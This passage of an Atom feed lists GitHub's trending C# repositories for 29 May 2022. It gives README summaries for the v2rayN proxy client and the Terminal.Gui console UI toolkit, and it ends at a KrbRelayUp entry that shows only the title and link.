<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-05-29T01:36:31Z</updated>
  <subtitle>Daily Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>2dust/v2rayN</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/2dust/v2rayN</id>
    <link href="https://github.com/2dust/v2rayN" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A V2Ray client for Windows, support Xray core and v2fly core&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;v2rayN&lt;/h1&gt; &#xA;&lt;p&gt;A V2Ray client for Windows, support &lt;a href=&#34;https://github.com/XTLS/Xray-core&#34;&gt;Xray core&lt;/a&gt; and &lt;a href=&#34;https://github.com/v2fly/v2ray-core&#34;&gt;v2fly core&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/2dust/v2rayN/commits/master&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/commit-activity/m/2dust/v2rayN&#34; alt=&#34;GitHub commit activity&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.codefactor.io/repository/github/2dust/v2rayn&#34;&gt;&lt;img src=&#34;https://www.codefactor.io/repository/github/2dust/v2rayn/badge&#34; alt=&#34;CodeFactor&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/2dust/v2rayN/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/downloads/2dust/v2rayN/latest/total?logo=github&#34; alt=&#34;GitHub Releases&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://t.me/v2rayn&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Chat%20on-Telegram-brightgreen.svg?sanitize=true&#34; alt=&#34;Chat on Telegram&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;How to use&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;If you are newbie please download v2rayN-Core.zip from releases&lt;/li&gt; &#xA; &lt;li&gt;Otherwise please download v2rayN.zip (Also need to download v2ray core in the same folder)&lt;/li&gt; &#xA; &lt;li&gt;Run v2rayN.exe&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Requirements&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Microsoft &lt;a href=&#34;https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/thank-you/net48-web-installer&#34;&gt;.NET Framework 4.8&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;v2fly core &lt;a href=&#34;https://github.com/v2fly/v2ray-core/releases&#34;&gt;https://github.com/v2fly/v2ray-core/releases&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Xray core &lt;a href=&#34;https://github.com/XTLS/Xray-core/releases&#34;&gt;https://github.com/XTLS/Xray-core/releases&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>migueldeicaza/gui.cs</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/migueldeicaza/gui.cs</id>
    <link href="https://github.com/migueldeicaza/gui.cs" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Console-based user interface toolkit for .NET applications.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://github.com/migueldeicaza/gui.cs/workflows/.NET%20Core/badge.svg?branch=master&#34; alt=&#34;.NET Core&#34;&gt; &lt;img src=&#34;https://github.com/migueldeicaza/gui.cs/workflows/Code%20scanning%20-%20action/badge.svg?sanitize=true&#34; alt=&#34;Code scanning - action&#34;&gt; &lt;a href=&#34;https://www.nuget.org/packages/Terminal.Gui&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Terminal.Gui.svg?sanitize=true&#34; alt=&#34;Version&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/migueldeicaza/90ef67a684cb71db1817921a970f8d27/raw/code-coverage.json&#34; alt=&#34;Code Coverage&#34;&gt; &lt;a href=&#34;https://www.nuget.org/packages/Terminal.Gui&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Terminal.Gui&#34; alt=&#34;Downloads&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/migueldeicaza/gui.cs/main/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/migueldeicaza/gui.cs.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/issues/migueldeicaza/gui.cs/bug&#34; alt=&#34;Bugs&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Terminal.Gui - Cross Platform Terminal UI toolkit for .NET&lt;/h1&gt; &#xA;&lt;p&gt;A toolkit for building rich console apps for .NET, .NET Core, and Mono that works on Windows, the Mac, and Linux/Unix.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/migueldeicaza/gui.cs/master/docfx/sample.gif&#34; alt=&#34;Sample app&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Controls and Views&lt;/h2&gt; &#xA;&lt;p&gt;&lt;em&gt;Terminal.Gui&lt;/em&gt; provides a rich set of views and controls for building terminal user interfaces:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.Button.html&#34;&gt;Button&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.CheckBox.html&#34;&gt;CheckBox&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.ColorPicker.html&#34;&gt;ColorPicker&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.ComboBox.html&#34;&gt;ComboBox&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.Dialog.html&#34;&gt;Dialog&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.OpenDialog.html&#34;&gt;OpenDialog&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.SaveDialog.html&#34;&gt;SaveDialog&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.FrameView.html&#34;&gt;FrameView&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.GraphView.html&#34;&gt;GraphView&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.HexView.html&#34;&gt;Hex viewer/editor&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.Label.html&#34;&gt;Label&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.ListView.html&#34;&gt;ListView&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.MenuBar.html&#34;&gt;Menu&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.MessageBox.html&#34;&gt;MessageBox&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.ProgressBar.html&#34;&gt;ProgressBar&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.RadioGroup.html&#34;&gt;Radio buttons&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.TableView.html&#34;&gt;TableView&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.TimeField.html&#34;&gt;Time &amp;amp; Date Fields&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.TextField.html&#34;&gt;TextField&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.TextValidateField.html&#34;&gt;TextValidateField&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.TextView.html&#34;&gt;TextView (Text Editor)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.TreeView.html&#34;&gt;TreeView&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.ScrollView.html&#34;&gt;ScrollView&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.ScrollBarView.html&#34;&gt;ScrollBarView&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.StatusBar.html&#34;&gt;StatusBar&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.Window.html&#34;&gt;Window&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Features&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Cross Platform&lt;/strong&gt; - Windows, Mac, and Linux. Terminal drivers for Curses, &lt;a href=&#34;https://github.com/migueldeicaza/gui.cs/issues/27&#34;&gt;Windows Console&lt;/a&gt;, and the .NET Console mean apps will work well on both color and monochrome terminals.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Keyboard and Mouse Input&lt;/strong&gt; - Both keyboard and mouse input are supported, including support for drag &amp;amp; drop.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/articles/overview.html#layout&#34;&gt;Flexible Layout&lt;/a&gt;&lt;/strong&gt; - Supports both &lt;em&gt;Absolute layout&lt;/em&gt; and an innovative &lt;em&gt;Computed Layout&lt;/em&gt; system. &lt;em&gt;Computed Layout&lt;/em&gt; makes it easy to layout controls relative to each other and enables dynamic terminal UIs.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Clipboard support&lt;/strong&gt; - Cut, Copy, and Paste of text provided through the &lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.Clipboard.html&#34;&gt;&lt;code&gt;Clipboard&lt;/code&gt;&lt;/a&gt; class.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.View.html&#34;&gt;Arbitrary Views&lt;/a&gt;&lt;/strong&gt; - All visible UI elements are subclasses of the &lt;code&gt;View&lt;/code&gt; class, and these in turn can contain an arbitrary number of sub-views.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Advanced App Features&lt;/strong&gt; - The &lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.MainLoop.html&#34;&gt;Mainloop&lt;/a&gt; supports processing events, idle handlers, timers, and monitoring file descriptors. Most classes are safe for threading.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Reactive Extensions&lt;/strong&gt; - Use &lt;a href=&#34;https://github.com/dotnet/reactive&#34;&gt;reactive extensions&lt;/a&gt; and benefit from increased code readability, and the ability to apply the MVVM pattern and &lt;a href=&#34;https://www.reactiveui.net/&#34;&gt;ReactiveUI&lt;/a&gt; data bindings. See the &lt;a href=&#34;https://github.com/migueldeicaza/gui.cs/tree/master/ReactiveExample&#34;&gt;source code&lt;/a&gt; of a sample app in order to learn how to achieve this.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Keyboard Input Handling&lt;/h3&gt; &#xA;&lt;p&gt;&lt;strong&gt;Terminal.Gui&lt;/strong&gt; respects common Linux, Mac, and Windows keyboard idioms. For example, clipboard operations use the familiar &lt;code&gt;Control/Command-C, X, V&lt;/code&gt; model. &lt;code&gt;CTRL-Q&lt;/code&gt; is used for exiting views (and apps).&lt;/p&gt; &#xA;&lt;p&gt;The input handling of &lt;strong&gt;Terminal.Gui&lt;/strong&gt; is similar in some ways to Emacs and the Midnight Commander, so you can expect some of the special key combinations to be active.&lt;/p&gt; &#xA;&lt;p&gt;The key &lt;code&gt;ESC&lt;/code&gt; can act as an Alt modifier (or Meta in Emacs parlance), to allow input on terminals that do not have an alt key. So to produce the sequence &lt;code&gt;Alt-F&lt;/code&gt;, you can press either &lt;code&gt;Alt-F&lt;/code&gt;, or &lt;code&gt;ESC&lt;/code&gt; followed by the key &lt;code&gt;F&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To enter the key &lt;code&gt;ESC&lt;/code&gt;, you can either press &lt;code&gt;ESC&lt;/code&gt; and wait 100 milliseconds, or you can press &lt;code&gt;ESC&lt;/code&gt; twice.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;ESC-0&lt;/code&gt;, and &lt;code&gt;ESC-1&lt;/code&gt; through &lt;code&gt;ESC-9&lt;/code&gt; have a special meaning, they map to &lt;code&gt;F10&lt;/code&gt;, and &lt;code&gt;F1&lt;/code&gt; to &lt;code&gt;F9&lt;/code&gt; respectively.&lt;/p&gt; &#xA;&lt;p&gt;Apps can change key bindings using the &lt;code&gt;AddKeyBinding&lt;/code&gt; API.&lt;/p&gt; &#xA;&lt;h3&gt;Driver Model&lt;/h3&gt; &#xA;&lt;p&gt;&lt;strong&gt;Terminal.Gui&lt;/strong&gt; has support for &lt;a href=&#34;https://github.com/migueldeicaza/gui.cs/raw/master/Terminal.Gui/ConsoleDrivers/CursesDriver/CursesDriver.cs&#34;&gt;ncurses&lt;/a&gt;, &lt;a href=&#34;https://github.com/migueldeicaza/gui.cs/raw/master/Terminal.Gui/ConsoleDrivers/NetDriver.cs&#34;&gt;&lt;code&gt;System.Console&lt;/code&gt;&lt;/a&gt;, and a full &lt;a href=&#34;https://github.com/migueldeicaza/gui.cs/raw/master/Terminal.Gui/ConsoleDrivers/WindowsDriver.cs&#34;&gt;Win32 Console&lt;/a&gt; front-end.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;ncurses&lt;/code&gt; is used on Mac/Linux/Unix with color support based on what your library is compiled with; the Windows driver supports full color and mouse, and an easy-to-debug &lt;code&gt;System.Console&lt;/code&gt; can be used on Windows and Unix, but lacks mouse support.&lt;/p&gt; &#xA;&lt;p&gt;You can force the use of &lt;code&gt;System.Console&lt;/code&gt; on Unix as well; see &lt;code&gt;Core.cs&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Showcase &amp;amp; Examples&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/migueldeicaza/gui.cs/tree/master/UICatalog&#34;&gt;UI Catalog&lt;/a&gt;&lt;/strong&gt; - The UI Catalog project provides an easy to use and extend sample illustrating the capabilities of &lt;strong&gt;Terminal.Gui&lt;/strong&gt;. Run &lt;code&gt;dotnet run --project UICatalog&lt;/code&gt; to run the UI Catalog.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/migueldeicaza/gui.cs/tree/master/ReactiveExample&#34;&gt;Reactive Example&lt;/a&gt;&lt;/strong&gt; - A sample app that shows how to use &lt;code&gt;System.Reactive&lt;/code&gt; and &lt;code&gt;ReactiveUI&lt;/code&gt; with &lt;code&gt;Terminal.Gui&lt;/code&gt;. The app uses the MVVM architecture that may seem familiar to folks coming from WPF, Xamarin Forms, UWP, Avalonia, or Windows Forms. In this app, we implement the data bindings using ReactiveUI &lt;code&gt;WhenAnyValue&lt;/code&gt; syntax and &lt;a href=&#34;https://github.com/reactiveui/pharmacist&#34;&gt;Pharmacist&lt;/a&gt; — a tool that converts all events in a NuGet package into observable wrappers.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/migueldeicaza/gui.cs/tree/master/Example&#34;&gt;Example (aka &lt;code&gt;demo.cs&lt;/code&gt;)&lt;/a&gt;&lt;/strong&gt; - Run &lt;code&gt;dotnet run&lt;/code&gt; in the &lt;code&gt;Example&lt;/code&gt; directory to run the simple demo.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/migueldeicaza/gui.cs/tree/master/StandaloneExample&#34;&gt;Standalone Example&lt;/a&gt;&lt;/strong&gt; - A trivial .NET core sample application can be found in the &lt;code&gt;StandaloneExample&lt;/code&gt; directory. Run &lt;code&gt;dotnet run&lt;/code&gt; in directory to test.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/migueldeicaza/gui.cs/tree/master/FSharpExample&#34;&gt;F# Example&lt;/a&gt;&lt;/strong&gt; - An example showing how to build a Terminal.Gui app using F#.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/PowerShell/GraphicalTools/raw/master/docs/Microsoft.PowerShell.ConsoleGuiTools/Out-ConsoleGridView.md&#34;&gt;PowerShell&#39;s &lt;code&gt;Out-ConsoleGridView&lt;/code&gt;&lt;/a&gt;&lt;/strong&gt; - &lt;code&gt;OCGV&lt;/code&gt; sends the output from a command to an interactive table.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/En3Tho/PoshRedisViewer&#34;&gt;PoshRedisViewer&lt;/a&gt;&lt;/strong&gt; - A compact Redis viewer module for PowerShell written in F# and Gui.cs&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/articles/overview.html&#34;&gt;Overview&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/articles/index.html&#34;&gt;Conceptual Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/api/Terminal.Gui/Terminal.Gui.html&#34;&gt;API Documentation&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://github.com/migueldeicaza/gui.cs/tree/master/Terminal.Gui&#34;&gt;&lt;code&gt;Terminal.Gui/&lt;/code&gt; README&lt;/a&gt; for an overview of how the library is structured. The &lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/articles/index.html&#34;&gt;Conceptual Documentation&lt;/a&gt; provides insight into core concepts.&lt;/p&gt; &#xA;&lt;h3&gt;Sample Usage&lt;/h3&gt; &#xA;&lt;p&gt;(This code uses C# 9.0 &lt;a href=&#34;https://docs.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-9#top-level-statements&#34;&gt;Top-level statements&lt;/a&gt;.)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;using Terminal.Gui;&#xA;using NStack;&#xA;&#xA;Application.Init();&#xA;var top = Application.Top;&#xA;&#xA;// Creates the top-level window to show&#xA;var win = new Window(&#34;MyApp&#34;)&#xA;{&#xA;&#x9;X = 0,&#xA;&#x9;Y = 1, // Leave one row for the toplevel menu&#xA;&#xA;&#x9;// By using Dim.Fill(), it will automatically resize without manual intervention&#xA;&#x9;Width = Dim.Fill(),&#xA;&#x9;Height = Dim.Fill()&#xA;};&#xA;&#xA;top.Add(win);&#xA;&#xA;// Creates a menubar, the item &#34;New&#34; has a help menu.&#xA;var menu = new MenuBar(new MenuBarItem[] {&#xA;&#x9;&#x9;&#x9;new MenuBarItem (&#34;_File&#34;, new MenuItem [] {&#xA;&#x9;&#x9;&#x9;&#x9;new MenuItem (&#34;_New&#34;, &#34;Creates new file&#34;, null),&#xA;&#x9;&#x9;&#x9;&#x9;new MenuItem (&#34;_Close&#34;, &#34;&#34;,null),&#xA;&#x9;&#x9;&#x9;&#x9;new MenuItem (&#34;_Quit&#34;, &#34;&#34;, () =&amp;gt; { if (Quit ()) top.Running = false; })&#xA;&#x9;&#x9;&#x9;}),&#xA;&#x9;&#x9;&#x9;new MenuBarItem (&#34;_Edit&#34;, new MenuItem [] {&#xA;&#x9;&#x9;&#x9;&#x9;new MenuItem (&#34;_Copy&#34;, &#34;&#34;, null),&#xA;&#x9;&#x9;&#x9;&#x9;new MenuItem (&#34;C_ut&#34;, &#34;&#34;, null),&#xA;&#x9;&#x9;&#x9;&#x9;new MenuItem (&#34;_Paste&#34;, &#34;&#34;, null)&#xA;&#x9;&#x9;&#x9;})&#xA;&#x9;&#x9;});&#xA;top.Add(menu);&#xA;&#xA;static bool Quit()&#xA;{&#xA;&#x9;var n = MessageBox.Query(50, 7, &#34;Quit Demo&#34;, &#34;Are you sure you want to quit this demo?&#34;, &#34;Yes&#34;, &#34;No&#34;);&#xA;&#x9;return n == 0;&#xA;}&#xA;&#xA;var login = new Label(&#34;Login: &#34;) { X = 3, Y = 2 };&#xA;var password = new Label(&#34;Password: &#34;)&#xA;{&#xA;&#x9;X = Pos.Left(login),&#xA;&#x9;Y = Pos.Top(login) + 1&#xA;};&#xA;var loginText = new TextField(&#34;&#34;)&#xA;{&#xA;&#x9;X = Pos.Right(password),&#xA;&#x9;Y = Pos.Top(login),&#xA;&#x9;Width = 40&#xA;};&#xA;var passText = new TextField(&#34;&#34;)&#xA;{&#xA;&#x9;Secret = true,&#xA;&#x9;X = Pos.Left(loginText),&#xA;&#x9;Y = Pos.Top(password),&#xA;&#x9;Width = Dim.Width(loginText)&#xA;};&#xA;&#xA;// Add some controls, &#xA;win.Add(&#xA;&#x9;// The ones with my favorite layout system, Computed&#xA;&#x9;login, password, loginText, passText,&#xA;&#xA;&#x9;// The ones laid out like an australopithecus, with Absolute positions:&#xA;&#x9;new CheckBox(3, 6, &#34;Remember me&#34;),&#xA;&#x9;new RadioGroup(3, 8, new ustring[] { &#34;_Personal&#34;, &#34;_Company&#34; }, 0),&#xA;&#x9;new Button(3, 14, &#34;Ok&#34;),&#xA;&#x9;new Button(10, 14, &#34;Cancel&#34;),&#xA;&#x9;new Label(3, 18, &#34;Press F9 or ESC plus 9 to activate the menubar&#34;)&#xA;);&#xA;&#xA;Application.Run();&#xA;Application.Shutdown();&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The example above shows adding views using both styles of layout supported by &lt;strong&gt;Terminal.Gui&lt;/strong&gt;: &lt;strong&gt;Absolute layout&lt;/strong&gt; and &lt;strong&gt;&lt;a href=&#34;https://migueldeicaza.github.io/gui.cs/articles/overview.html#layout&#34;&gt;Computed layout&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Alternatively, you can encapsulate the app behavior in a new &lt;code&gt;Window&lt;/code&gt;-derived class, say &lt;code&gt;App.cs&lt;/code&gt; containing the code above, and simplify your &lt;code&gt;Main&lt;/code&gt; method to:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;using Terminal.Gui;&#xA;&#xA;class Demo {&#xA;&#x9;static void Main ()&#xA;&#x9;{&#xA;&#x9;&#x9;Application.Run&amp;lt;App&amp;gt; ();&#xA;&#x9;&#x9;Application.Shutdown ();&#xA;&#x9;}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Installing&lt;/h2&gt; &#xA;&lt;p&gt;Use NuGet to install the &lt;code&gt;Terminal.Gui&lt;/code&gt; NuGet package: &lt;a href=&#34;https://www.nuget.org/packages/Terminal.Gui&#34;&gt;https://www.nuget.org/packages/Terminal.Gui&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Installation in .NET Core Projects&lt;/h3&gt; &#xA;&lt;p&gt;To install Terminal.Gui into a .NET Core project, use the &lt;code&gt;dotnet&lt;/code&gt; CLI tool with following command.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;dotnet add package Terminal.Gui&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Running and Building&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Windows, Mac, and Linux - Build and run using the .NET SDK command line tools (&lt;code&gt;dotnet build&lt;/code&gt; in the root directory). Run &lt;code&gt;UICatalog&lt;/code&gt; with &lt;code&gt;dotnet run --project UICatalog&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Windows - Open &lt;code&gt;Terminal.Gui.sln&lt;/code&gt; with Visual Studio 2019.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Building in &lt;code&gt;Release&lt;/code&gt; requires the &lt;a href=&#34;https://git-scm.com/&#34;&gt;git command line tool&lt;/a&gt; (a dependency of the &lt;a href=&#34;https://github.com/adamralph/minver#can-i-disable-minver&#34;&gt;MinVer&lt;/a&gt; build tool)&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/migueldeicaza/gui.cs/raw/master/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Debates on architecture and design can be found in Issues tagged with &lt;a href=&#34;https://github.com/migueldeicaza/gui.cs/issues?q=is%3Aopen+is%3Aissue+label%3Adesign&#34;&gt;design&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;History&lt;/h2&gt; &#xA;&lt;p&gt;This is an updated version of &lt;a href=&#34;http://tirania.org/blog/archive/2007/Apr-16.html&#34;&gt;gui.cs&lt;/a&gt; that Miguel wrote for &lt;a href=&#34;https://github.com/mono/mono-curses&#34;&gt;mono-curses&lt;/a&gt; in 2007.&lt;/p&gt; &#xA;&lt;p&gt;The original &lt;strong&gt;gui.cs&lt;/strong&gt; was a UI toolkit in a single file and tied to curses. This version tries to be console-agnostic and instead of having a container/widget model, only uses Views (which can contain subviews) and changes the rendering model to rely on damage regions instead of burdening each view with the details.&lt;/p&gt; &#xA;&lt;p&gt;A presentation of this was part of the &lt;a href=&#34;https://channel9.msdn.com/Events/dotnetConf/2018/S313&#34;&gt;Retro.NET&lt;/a&gt; talk at .NET Conf 2018 &lt;a href=&#34;https://tirania.org/Retro.pdf&#34;&gt;Slides&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Release history can be found in the &lt;a href=&#34;https://github.com/migueldeicaza/gui.cs/raw/master/Terminal.Gui/Terminal.Gui.csproj&#34;&gt;Terminal.Gui.csproj&lt;/a&gt; file.&lt;/p&gt; &#xA;&lt;p&gt;In 2019, 2020, and 2021, Charlie Kindel (&lt;a href=&#34;https://github.com/tig&#34;&gt;https://github.com/tig&lt;/a&gt;), @BDisp (&lt;a href=&#34;https://github.com/BDisp&#34;&gt;https://github.com/BDisp&lt;/a&gt;), and Thomas Nind (&lt;a href=&#34;https://github.com/tznind&#34;&gt;https://github.com/tznind&lt;/a&gt;) vastly extended, improved, polished and fixed gui.cs to what it is today.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Dec0ne/KrbRelayUp</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/Dec0ne/KrbRelayUp</id>
    <link href="https://github.com/Dec0ne/KrbRelayUp" rel="alternate"></link>
